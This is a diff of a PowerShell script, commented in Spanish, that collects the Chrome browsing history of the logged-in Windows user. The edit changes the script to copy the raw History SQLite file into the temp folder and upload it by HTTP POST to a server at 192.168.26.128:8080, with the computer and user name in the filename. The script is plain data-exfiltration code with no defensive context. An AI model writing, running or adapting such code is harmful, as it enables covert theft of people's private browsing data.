@@ -1,20 +1,19 @@
 # ========================
-# Recolección de historial
+# Recolección de historial 
 # ========================
 $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
 $computerName = $env:COMPUTERNAME
 $username = $env:USERNAME
 
 $histPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
-$tempHist = "$env:TEMP\history_copy"
-$outHistTxt = "$env:TEMP\historial_extraido.txt"
+$tempHist = "$env:TEMP\history_copy.sqlite"
 
 if (Test-Path $histPath) {
     Copy-Item $histPath $tempHist -Force
 
-    # Enviar historial con nombre único
-    $histFileName = "historial_${computerName}_${username}_$timestamp.txt"
-    Invoke-WebRequest -Uri "http://192.168.26.128:8080/upload?file=$histFileName" -Method POST -InFile $outHistTxt -UseBasicParsing
+    # Enviar archivo SQLite como binario
+    $histFileName = "historial_${computerName}_${username}_$timestamp.sqlite"
+    Invoke-WebRequest -Uri "http://192.168.26.128:8080/upload?file=$histFileName" -Method POST -InFile $tempHist -UseBasicParsing
 }
 
 # =============================
